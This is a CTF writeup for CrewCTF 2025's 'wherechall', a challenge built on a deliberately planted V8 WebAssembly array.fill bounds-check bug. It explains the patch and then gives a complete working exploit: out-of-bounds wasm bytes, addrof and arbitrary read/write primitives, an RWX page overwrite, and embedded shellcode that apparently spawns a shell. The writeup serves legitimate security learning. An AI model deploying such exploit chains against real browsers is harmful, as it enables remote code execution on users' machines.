---
title: "wherechall"
date: 2025-09-21
event: CrewCTF 2025
points: 449
difficulty: hard
tags: ["v8", "wasm", "arrayfill"]
---

Over the weekend, I participated in `CrewCTF` with `Infobahn` team and ended up getting 6th place. This writeup details my approach to the "`wherechall`" problem, a V8 challenge centered around a patch to the WebAssembly `arrayfill` function.

## Challenge Patch

```patch
diff --git a/src/wasm/baseline/liftoff-compiler.cc b/src/wasm/baseline/liftoff-compiler.cc
index 080697f5be1..860feb8d5d1 100644
--- a/src/wasm/baseline/liftoff-compiler.cc
+++ b/src/wasm/baseline/liftoff-compiler.cc
@@ -7700,7 +7700,16 @@ class LiftoffCompiler {
       LiftoffRegister index_plus_length =
           pinned.set(__ GetUnusedRegister(kGpReg, pinned));
       DCHECK(index_plus_length != array_length);
-      __ emit_i32_add(index_plus_length.gp(), length.gp(), index.gp());
+      ValueKind elem_kind = imm.array_type->element_type().kind();
+      if (implicit_null_check) {
+        LiftoffRegister len_approx =
+            pinned.set(__ GetUnusedRegister(kGpReg, pinned));
+        __ emit_i32_shri(len_approx.gp(), length.gp(),
+                         value_kind_size_log2(elem_kind));
+        __ emit_i32_add(index_plus_length.gp(), len_approx.gp(), index.gp());
+      } else {
+        __ emit_i32_add(index_plus_length.gp(), length.gp(), index.gp());
+      }
       OolTrapLabel trap =
           AddOutOfLineTrap(decoder, Builtin::kThrowWasmTrapArrayOutOfBounds);
       __ emit_cond_jump(kUnsignedGreaterThan, trap.label(), kI32,
```

## Understanding the Patch

To grasp the impact of this patch, let's review the `arrayfill` function. This function fills a WebAssembly array with a specified value, starting at a given index and for a given length. The arguments are taken from the stack.

```cpp
void ArrayFill(FullDecoder* decoder, ArrayIndexImmediate& imm,
                const Value& array, const Value& /* index */,
                const Value& /* value */, const Value& /* length */) {
FUZZER_HEAVY_INSTRUCTION;
{
    // Null check.
    LiftoffRegList pinned;
    LiftoffRegister array_reg = pinned.set(__ PeekToRegister(3, pinned));
    if (null_check_strategy_ == compiler::NullCheckStrategy::kExplicit) {
    MaybeEmitNullCheck(decoder, array_reg.gp(), pinned, array.type);
    }
    // Bounds checks.
    LiftoffRegister array_length =
        pinned.set(__ GetUnusedRegister(kGpReg, pinned));
    bool implicit_null_check =
        array.type.is_nullable() &&
        null_check_strategy_ == compiler::NullCheckStrategy::kTrapHandler;
    LoadObjectField(decoder, array_length, array_reg.gp(), no_reg,
                    ObjectAccess::ToTagged(WasmArray::kLengthOffset), kI32,
                    false, implicit_null_check, pinned);
    LiftoffRegister index = pinned.set(__ PeekToRegister(2, pinned));
    LiftoffRegister length = pinned.set(__ PeekToRegister(0, pinned));
    LiftoffRegister index_plus_length =
        pinned.set(__ GetUnusedRegister(kGpReg, pinned));
    DCHECK(index_plus_length != array_length);
    __ emit_i32_add(index_plus_length.gp(), length.gp(), index.gp());
    OolTrapLabel trap =
        AddOutOfLineTrap(decoder, Builtin::kThrowWasmTrapArrayOutOfBounds);
    __ emit_cond_jump(kUnsignedGreaterThan, trap.label(), kI32,
                    index_plus_length.gp(), array_length.gp(),
                    trap.frozen());
    // Guard against overflow.
    __ emit_cond_jump(kUnsignedGreaterThan, trap.label(), kI32, index.gp(),
                    index_plus_length.gp(), trap.frozen());
}
LiftoffRegList pinned;
LiftoffRegister length = pinned.set(__ PopToModifiableRegister(pinned));
LiftoffRegister value = pinned.set(__ PopToRegister(pinned));
LiftoffRegister index = pinned.set(__ PopToModifiableRegister(pinned));
LiftoffRegister obj = pinned.set(__ PopToRegister(pinned));
ArrayFillImpl(decoder, pinned, obj, index, value, length,
                imm.array_type->element_type().kind(),
                LiftoffAssembler::kNoSkipWriteBarrier);
}
```

The function first checks for null arrays, then performs a bounds check by adding the index and length and ensuring the result does not exceed the array's length. The patch modifies this line => `__ emit_i32_add(index_plus_length.gp(), length.gp(), index.gp());`. If the array is a nullable reference, it right-shifts the length by the log2 of the element size before adding it to the `index`. This can result in a much smaller value being checked, potentially allowing out-of-bounds writes.

## The Vulnerability

The bug is straightforward: the bounds check can be bypassed because the length is reduced by a right shift, but the actual write still uses the original (larger) length. This allows for out-of-bounds access. To exploit this, we can create a WebAssembly module with a nullable reference array and use `array.fill` to trigger the bug.

```wat
(module
  (type $A (array (mut i64)))

  ;; Function to create and return an array to JS context
  (func (export "createArray") (result (ref null $A))
    ;; Create array with 12 elements
    (array.new_default $A (i32.const 12))
  )

  ;; Function to trigger the OOB bug with the array
  (func (export "fillArray") (param $a (ref null $A))
    (array.fill $A 
      (local.get $a)
      (i32.const 0)
      (i64.const {value to overwrite})
      (i32.const 0x15)
    )
  )
)
```

Here, we create an array of 12 elements, but call `array.fill` with a length of 0x15 (21). Due to the right shift, the bounds check passes, but the function writes far beyond the end of the array.

In JavaScript, we can interact with this module as follows:

```js
var wasm_code = new Uint8Array([
  // ... wasm binary ...
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var fil = wasm_instance.exports.fillArray;
var creArray = wasm_instance.exports.createArray;

let a = creArray();
let oob = [1.1, 2.2, 3.3, 4.4];
let oob_helper = [69.69, 2.2, 3.3, 4.4];
let addr_helper = [{}, {}]
fil(a)
```

> Approach: I used `arrayfill` twice—first to corrupt the size and elements pointer, then to fix up the map and property pointers for a stable exploit.

## Exploitation Steps

Once out-of-bounds access is achieved, the rest of the exploit follows standard V8 exploitation techniques, such as leveraging a WebAssembly RWX page to run shellcode, as the heap sandbox is disabled. If you need more details, check out my other [blogs](https://tourpran.github.io/posts/v8-ArrayShift-Race-Condition.html)!

> Note: The exploit may not work reliably on all setups. I had to brute-force the offset variable for stability.

```js
///////////////////////////////////////////////////////////////////////
///////////////////         Utility Functions       ///////////////////
///////////////////////////////////////////////////////////////////////

let hex = (val) => '0x' + val.toString(16);

// 8 byte array buffer
const __buf = new ArrayBuffer(8);
const __f64_buf = new Float64Array(__buf);
const __u32_buf = new Uint32Array(__buf);

// typeof(val) = float
function ftoi(val) {
    __f64_buf[0] = val;
    return BigInt(__u32_buf[0]) + (BigInt(__u32_buf[1]) << 32n); // Watch for little endianness
}

function print(x){
    console.log("[+] " + x);
}

// typeof(val) = BigInt
function itof(val) {
    __u32_buf[0] = Number(val & 0xffffffffn);
    __u32_buf[1] = Number(val >> 32n);
    return __f64_buf[0];
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function reverse(x) {
    var buf = new ArrayBuffer(0x20);
    var view1 = new BigInt64Array(buf);
    var view2 = new Uint8Array(buf);
    view1[0] = x;
    view2.reverse();
    return view1[3];
}

function assert(x) {
	console.assert(x);
}

function gc() {
  for (let i = 0; i < 0x20; i++) new ArrayBuffer(0x1000000);
}


////////////////////////////////////////////////////////////////////////
/////////////////////         Main Exploit         /////////////////////
////////////////////////////////////////////////////////////////////////

gc();

var wasm_code1 = new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x05,0x01,0x60,0x00,0x01,0x7c,0x03,0x02,0x01,0x00,0x07,0x08,0x01,0x04,0x6d,0x61,0x69,0x6e,0x00,0x00,0x0a,0x53,0x01,0x51,0x00,0x44,0xbb,0x2f,0x73,0x68,0x00,0x90,0xeb,0x07,0x44,0x48,0xc1,0xe3,0x20,0x90,0x90,0xeb,0x07,0x44,0xba,0x2f,0x62,0x69,0x6e,0x90,0xeb,0x07,0x44,0x48,0x01,0xd3,0x53,0x31,0xc0,0xeb,0x07,0x44,0xb0,0x3b,0x48,0x89,0xe7,0x90,0xeb,0x07,0x44,0x31,0xd2,0x48,0x31,0xf6,0x90,0xeb,0x07,0x44,0x0f,0x05,0x90,0x90,0x90,0x90,0xeb,0x07,0x44,0x0f,0x05,0x90,0x90,0x90,0x90,0xeb,0x07,0x1a,0x1a,0x1a,0x1a,0x1a,0x1a,0x1a,0x0b]);
var wasm_mod1 = new WebAssembly.Module(wasm_code1);
var wasm_instance1 = new WebAssembly.Instance(wasm_mod1);
var f1 = wasm_instance1.exports.main;


// to corrupt the pointer here.
var wasm_code_helper = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod_helper = new WebAssembly.Module(wasm_code_helper);
var wasm_instance_helper = new WebAssembly.Instance(wasm_mod_helper);
var f2 = wasm_instance_helper.exports.main;

var wasm_code = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x0e, 0x03, 0x5e,
  0x7e, 0x01, 0x60, 0x00, 0x01, 0x63, 0x00, 0x60, 0x01, 0x63, 0x00, 0x00,
  0x03, 0x03, 0x02, 0x01, 0x02, 0x07, 0x1b, 0x02, 0x0b, 0x63, 0x72, 0x65,
  0x61, 0x74, 0x65, 0x41, 0x72, 0x72, 0x61, 0x79, 0x00, 0x00, 0x09, 0x66,
  0x69, 0x6c, 0x6c, 0x41, 0x72, 0x72, 0x61, 0x79, 0x00, 0x01, 0x0a, 0x30,
  0x02, 0x07, 0x00, 0x41, 0x0c, 0xfb, 0x07, 0x00, 0x0b, 0x26, 0x00, 0x20,
  0x00, 0x41, 0x00, 0x42, 0x81, 0x80, 0x80, 0x80, 0xf0, 0xff, 0xff, 0xff,
  0x00, 0x41, 0x16, 0xfb, 0x10, 0x00, 0x20, 0x00, 0x41, 0x00, 0x42, 0xc9,
  0xa2, 0x93, 0x80, 0xd0, 0xf7, 0x01, 0x41, 0x15, 0xfb, 0x10, 0x00, 0x0b,
  0x00, 0x13, 0x04, 0x6e, 0x61, 0x6d, 0x65, 0x02, 0x06, 0x01, 0x01, 0x01,
  0x00, 0x01, 0x61, 0x04, 0x04, 0x01, 0x00, 0x01, 0x41
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var fil = wasm_instance.exports.fillArray;
var creArray = wasm_instance.exports.createArray;

let a = creArray();
let oob = [1.1, 2.2, 3.3, 4.4];
let oob_helper = [69.69, 2.2, 3.3, 4.4];
let addr_helper = [{}, {}]
fil(a)

let offset = 0x20126 + -21;

function addrof(obj){
  addr_helper[0] = obj;
  return ftoi(oob[offset + 5]) % 0x100000000n;
}

function arb_read(addr){
  oob[offset] = itof(0x1000000000n + addr - 0x8n);
  return ftoi(oob_helper[0]);
}

function arb_write(addr, val){
  oob[offset] = itof(0x1000000000n + addr - 0x8n);
  oob_helper[0] = itof(val);
}

let addr_wasm_instance = addrof(wasm_instance1);
let trusted = arb_read(addr_wasm_instance + 12n);
let rwx = arb_read(trusted + 40n);

console.log("Trusted: " + hex(trusted));
console.log("RWX: " + hex(rwx));

let addr_wasm_instance1 = addrof(wasm_instance_helper);
let trusted1 = arb_read(addr_wasm_instance1 + 12n);
let rwx1 = arb_read(trusted1 + 40n);

console.log("Helper Trusted: " + hex(trusted1));
console.log("Helper RWX: " + hex(rwx1));

f1()
arb_write((trusted1 + 40n), (rwx + 0x95bn));
f2()
```

For the shellcode smuggling part the wat file looked something like this, (Try to figure this out on your own by reading this : [blog](https://tourpran.github.io/posts/v8-ArrayShift-Race-Condition.html))
```
(module
  (func (export "main") (result f64)
    f64.const 1.240196197799028e-308
    drop
    f64.const 1.1355999090986213e-303
    drop
    f64.const 7.442053784779479e-299
    drop
    f64.const 4.877365030478589e-294
    drop
    f64.const 3.1962457295249554e-289
    drop
    f64.const 2.0948120893270098e-284
    drop
    f64.const 1.3728174332323801e-279
    drop
    f64.const 8.997150447129912e-275
    drop
    f64.const 5.8960514372641125e-270
    drop
    f64.const 3.864246249432814e-265
    drop
    f64.const 2.5323267962459134e-260
    drop
    f64.const 1.6596813169086695e-255
    drop
    f64.const 1.0876267385074761e-250
    drop
    f64.const 7.128276160107913e-246
    drop
    f64.const 4.671453400062295e-241
    drop
    f64.const 3.0615716496931463e-236
    drop
    f64.const 2.0063749357997337e-231
    drop
    f64.const 1.3149348601223572e-226
    drop
    f64.const 8.617331597307637e-222
    drop
    f64.const 5.647602868521422e-217
    drop
    f64.const 3.7011451564768274e-212
    drop
    f64.const 2.425626683827619e-207
    drop
    f64.const 1.5896239261089822e-202
    drop
    f64.const 1.0417988474556261e-197
    drop
    f64.const 6.827533972812072e-193
    drop
    f64.const 4.4744926650348304e-188
    drop
    f64.const 2.9324035119709122e-183
    drop
    f64.const 1.921680091283746e-178
    drop
    f64.const 1.2594577174803942e-173
    drop
    f64.const 13.37
))
```